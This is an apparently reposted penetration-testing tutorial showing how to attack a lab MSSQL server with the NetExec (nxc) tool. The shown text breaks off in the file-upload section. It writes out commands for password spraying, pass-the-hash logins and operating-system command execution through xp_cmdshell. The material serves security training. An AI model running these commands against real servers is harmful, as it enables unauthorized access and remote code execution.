---
title: MSSQL for Pentester: NetExec
url: https://buaq.net/go-257993.html
source: unSafe.sh - 不安全
date: 2024-08-25
fetch_date: 2025-10-06T18:01:58.525499
---

# MSSQL for Pentester: NetExec

* [unSafe.sh - дёҚе®үе…Ё](https://unsafe.sh)
* [жҲ‘зҡ„ж”¶и—Ҹ](/user/collects)
* [д»Ҡж—ҘзғӯжҰң](/?hot=true)
* [е…¬дј—еҸ·ж–Үз«](/?gzh=true)
* [еҜјиҲӘ](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [зј–з Ғ/и§Јз Ғ](/encode)
* [ж–Үд»¶дј иҫ“](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
й»‘еӨңжЁЎејҸ

![](https://8aqnet.cdn.bcebos.com/1eb7035b13c802470f42f560a3047bfb.jpg)

MSSQL for Pentester: NetExec

NetExec (nxc) is a powerful network exploitation tool developed as a modern success
*2024-8-24 21:33:13
Author: [www.hackingarticles.in(жҹҘзңӢеҺҹж–Ү)](/jump-257993.htm)
йҳ…иҜ»йҮҸ:29
ж”¶и—Ҹ*

---

NetExec (nxc) is a powerful network exploitation tool developed as a modern successor to CrackMapExec (CME), which was widely used by penetration testers and red teamers. Earlier CrackMapExec was actively maintained by mpgn, after which NetExec emerged as a popular choice. In this article we are going to cover most of the parts where this tool can come in handy to automate tasks like password spraying, command execution, file upload and many more. Here we will be performing the test cases on MSSQL server using nxc tool.

### Table of Contents

* Lab Setup
* Password spray
* Password spray using Hashes
* Check Authentication
* Command execution
* Command execution with Hashes
* File upload and download
* Privilege escalation
* Enumeration on a different port number
* Conclusion

### Lab Setup

Target Machine: Windows 10 (192.168.31.126)

Attacker Machine: Kali Linux (192.168.31.141)

For demonstration purposes, here we will be using the MSSQL service to show all the test cases. We have already setup the MSSQL server on the target machine and created few users for the running instance.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3wEu8LvNPe67Mrl56UhEAjIrl8n8gYsIpLe2d0gIYzYH2-S6cWYuntilSSpS0153iB2U9J2UsP44XPRHFB00SN1TySdY4pb7XZNLyt95M5skGai4w2hhoMVdV4moGI0GVLPy7eo5MItZnRSlc1xSF-3yNoNOZyq0kmWmTH1QTzeg3fFoGeZ8wgf4rp1pX/s16000/1.png)

### **Password spray**

In order to check for the correct credentials, we will create a dictionary of usernames as **users.txt** and passwords as **pass.txt**. Once we have the dictionaries created, we can perform the password spray attack to check for the correct username and password. We are going to perform this spray on the MSSQL server. Following will be the command to do so:

```
nxc mssql 192.168.31.126 -u users.txt -p pass.txt --continue-on-success
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjygUDtnxa-VHtss3eb18cD4VVjXpHCu58Ip-qAeeaiqj2t2EDdq5W18fe0b2_v4RtLZN1Z-qxO57GL6lU3MpLDEUgU1-A_Wc4KSctiEdek213mU0GFYoZx1BbnFVvKQX2ROibyhwllSlz-oXXDnZUN_-s-oAsF08Z4U6WdKjAXhS8oGPsOIZTP8-O2Q8VT/s16000/50.png)

To perform the password spray using the local authentication, we can use theВ  В **вҖ“local-auth** flag as it specifies that the authentication attempts should be made against the local accounts on the MSSQL server.

```
nxc mssql 192.168.31.126 -u users.txt -p pass.txt --continue-on-success --local-auth
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgq6IcqaEJW0rZwJzvOIKOK3zQ2E9O_92zkHHKVxBJDLEfbTHDnMzAEerPIsw5rBDmlICd0zogfCdfd4yx56BD812-s-CGfTvlpbc4DtHXc75X9AjfgdB-fIbOv69BgpnTGtJaL5BJLpN6Xn9jnQyXXbt_Uraix8lbB_h30bGB2C1L24HpliQUKf847Ha2J/s16000/51.png)

### **Password spray using Hashes**

We can also perform the same if we have obtained a hash but we are not sure that the hash belongs to which user. Here we will be passing a list of users and giving the obtained hash value in the -H flag.

```
nxc mssql 192.168.31.126 -u users.txt -H 64FBAE31CC352FC26AF97CBDEF151E03 --continue-on-success
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqaehCKCMJKrRvT_7XZiNsP6oxCrUq5hFbhh0WtrI6lx2pb7mIw6C53uXZ0qc3iEn_E1r9mkOmSTE4DklxzaSDse4zkw0qllsVdn3XSnlT4WDXPGSStQluvhk9zihVkG-qDpTqcz3KFyIYrlx6Xg-GPpoCTuBCxMJMLwuu3cqR8GCB-tcd574vrtHyekPC/s16000/52.png)

If we want to perform password spray in such a way that each username should be used ony with its corresponding password from the list, then we can use the **вҖ“no-bruteforce** flag. If the username-password pair matches, it will proceed otherwise it will skip to the next pair without trying other possible combinations.

```
nxc mssql 192.168.31.126 -u users.txt -p pass.txt --continue-on-success --no-bruteforce
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFW9hG-kNouV0LJZEfD0jR1it7836EYsACS1aumwcfzP-EbzH8MFdhHDYFe25UG5SZGEVubQp8IJk_07BF-8itBk5fGssTxaZTdrQsSt60Fu1lyxNJxfDmCmOVUxEs9jmIGtOLbUtNoeJMLAgXJdGzffBQQp3oiNxBL_F4qUM6wsuXVAYYvu0bS9wQJFJF/s16000/4.png)

### **Check Authentication**

We can use two methods to authenticate to MSSQL i.e., **windows** or **local**, the default authentication is windows. To use local authentication, add the following flag **вҖ“local-auth** in the command. Here we are trying to perform the local authentication as **sa** user.

```
nxc mssql 192.168.31.126 -u sa -p 'Password@123' --local-auth
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0lkR0XP3LIcUEouqZ1u0uC7Ww-oPBEp2e96Hu6XSuktWWZHHvHnXA81-JTJqUzLDniINHpl1ji3EAJUU9ejnf_KPK1vvrSygzTG-lr22-3KJuTNIe6DhobCdU-44UuR8NeSoKFtsFuREV86ZVprgDwx3PdonMHyxYMgm0_kZKchluAEooTmI-FXgdfdQK/s16000/6.png)

As mentioned previously, we can also test for the windows authentication. Since the default mode is set to windows authentication, hence we donвҖҷt need to give any authentication flag to perform windows authentication.

```
nxc mssql 192.168.31.126 -u administrator -p 'Ignite@987'
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrrm6TQppmpysvge1C3Ym9Db5Y1QzrgOj7glOkaXawWtu-vqc4RDJubDeappTkrdd-qTi9-JWHYyPUmBJX_vnx-5YPy2FWkgi1hRLobnM6kLFdxaizbCRHcuHRwU-n1-9XD8MX5CIY4Ff0fvVo53kVAsTQ1ZpaagwHkRWDauvkgWVY97y2tDL0q6jFoUc_/s16000/7.png)

### DB Command execution using nxc

We can use **nxc** to query the database, by giving **-q** flag and then mentioning the database query. The command to do so will be:

```
nxc mssql 192.168.31.126 -u sa -p 'Password@123' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh29ADaHTi143CfWOyDA6nPFfdgx_XgyQ6U3xI3XEMWQUJ5AICwAvB2C0zhrLzszVfaAc_No1Oj9hGb3qrkilAoBrsTKaoxvZe-tAoz3Mn5DpAENN5PBvbkdyVf_BZ6tSl_FZluORIE2wJhdCa-LmP5shmCkGb7VdagC0FVGdGZxrCSz62ldb5glPxxHny1/s16000/8.png)

### Command execution using nxc

In order to perform the system level commands, we can use the **-x** flag which uses the MSSQL **xp\_cmdshell** to execute the commands. We can use both windows and local authentication here depending on our need.

```
nxc mssql 192.168.31.126 -u sa -p 'Password@123' --local-auth -x ipconfig
nxc mssql 192.168.31.126 -u administrator -p 'Ignite@987' -x ipconfig
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAqP7KiJ963ZzifbiQ4YxqwQEsXRmXbWyp7F10IO2_G13vdwKDZnEHlvqYIYXggWxu-c4XFYyqP9kqioENoHEK6qAR-VXoiH46osR7Oq2KAk1Jb9STcyIWkFkjFMNUfETzAu15BqqF0GItr-DTBkBsNqXXTAIuAGPj209cjVtKME6tGF4FhsoSXIBQjtol/s16000/9.png)

### Command execution with Hashes

Let us assume that somehow we get the hash of the administrator user and we want to execute the system level commands using MSSQL, so we can use **nxc** to perform that. First we will check if the windows authentication is successful or not and then we can give the **-x** flag to perform the command execution.

```
nxc mssql 192.168.31.126 -u administrator -H 32196B56FFE6F45E294117B91A83BF38
nxc mssql 192.168.31.126 -u administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7rCi0CWdNYSbR2bZRqaP7VwHThd3V-hXt_wZ73EHfvnYKc8NQ7tm1gES1exfsEIEwgmoIT0KVS9InzLduzp-HEom4H8GBbnmc4ZRh0K1FzDj-c_nXFcQL02VgVzaiW9P965y1FcMtMLLOSUFk8CoTezfgea9y87tesHw4QW2zVrD5zGiES8lli2kKQKib/s16000/30.png)

### File upload and download using nxc

We can also upload the file i...